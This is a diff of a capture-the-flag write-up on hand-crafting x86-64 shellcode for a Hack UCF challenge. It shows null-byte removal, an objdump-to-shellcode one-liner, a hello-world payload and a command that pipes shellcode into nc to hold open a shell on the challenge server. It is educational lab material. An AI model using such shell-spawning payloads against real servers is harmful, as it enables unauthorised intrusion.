@@ -14,7 +14,8 @@ nc ctf.hackucf.org 10103
 This write-up details some of my learning about shellcode. This means it gets pretty long and side-tracked from time to time.  
 The final shellcode performs `cat` on the file `flag.txt` on the server. You can just skip to the end and see what I did if you already know your shellcode.  
 Or you can get a shell on the server by looking at my `/bin/ls` example and changing the `ls` to `sh`.  
-If you want the quickest route to the flag, you can find existing shellcode solutions on-line and just use them. I tested one from http://shell-storm.org/shellcode/ (I tried Linux/x86 - execve(/bin/bash. [/bin/sh, -p]NULL) - 33 bytes and it worked well). **Warning**: Malwarebytes doesn't like this site, but I think it's ok - lots of h4x0r's use it  
+If you want the quickest route to the flag, you can find existing shellcode solutions on-line and just use them. I tested one from http://shell-storm.org/shellcode/ (I tried Linux/x86 - execve(/bin/bash. [/bin/sh, -p]NULL) - 33 bytes and it worked well).  
+**Warning**: Malwarebytes doesn't like the above site, but I think it's ok - lots of h4x0r's use it, but take care.  
 **Note:** If you use `/bin/sh` against a server, you need to force the server to wait after executing your command, or it will return without you being able to use the shell. To do this, your command line should be:  
 `(python -c "print('<your shellcode here>')" ; cat) | nc ctf.hackucf.org 10103`
 
@@ -55,7 +56,7 @@ I compiled the code with:
 ```
 > gcc -o shellcode-test shellcode-test.c
 ```
-Now I open it in IDA Pro and step through to ensure we call our 4 `nop` instructions.
+I opened it in IDA Pro and stepped through to ensure we call our 4 `nop` instructions.
 
 In the `main` function we can see our call to `shellcode`, and we can see that `shellcode` is in the data segment, and has our 4 `nop` instructions in it:
 
@@ -102,7 +103,7 @@ Now we need to create a set of assembly language instructions to mimic what this
 
 For 32-bit we should place the system call number into `EAX` and use `int 0x80` instead to make the call into the kernel.
 
-We can find both the system call numbers with
+We can find both the system call numbers with:
 ```
 > cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep execve
 #define __NR_execve 59
@@ -178,7 +179,7 @@ Disassembly of section .text:
   4000ac:	72 6c                	jb     40011a <dataFunc+0x7c>
   4000ae:	64 21 0a             	and    %ecx,%fs:(%rdx)
 ```
-First we need to get rid of the zero bytes in the machine code. If the in the challenge sees a zero,
+First we need to get rid of the zero bytes in the machine code. If the input request in the challenge sees a zero,
 it will assume it is the end of the string and stop reading any further.
 
 For these `mov` instructions it is relatively easy - just reduce the register to the 8-bit (LSB) versions. For `RAX/EAX` we can use `AL`, for `RDI/EDI` we can use `DIL` and for `RDX/EDX` we can use `DL`.
@@ -235,12 +236,12 @@ Disassembly of section .text:
   4000a1:	72 6c                	jb     40010f <dataFunc+0x7c>
   4000a3:	64 21 0a             	and    %ecx,%fs:(%rdx)
 ```
-This now has no zeros in, and so we can convert it to shellcode and test it in our C program. I used the following command (taken from [here]()) to convert the `objdump` output to shellcode
+This now has no zeros in, and so we can convert it to shellcode and test it in our C program. I used the following command (taken from [here](https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump)) to convert the `objdump` output to shellcode
 ```
 > objdump -d ./testbed|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\xeb\x11\x5e\xb0\x01\x40\xb7\x01\xb2\x0e\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05\xe8\xea\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a"
 ```
-I pasted the output the `shellcode` array in the C test program, compiled it and ran it. This didn't quite work - it hangs. The reason is that I now set the `AL` register to put my value in `RAX`, but I don't zero `RAX` first. The same is true of other registers. I updated the assembly to:
+I pasted the output to the `shellcode` array in the C test program, compiled it and ran it. This didn't quite work - it hangs. The reason is that I now set the `AL` register to put my value in `RAX`, but I don't zero `RAX` first. The same is true of other registers. I updated the assembly to:
 ```asm
 # Hello World test
          global _start
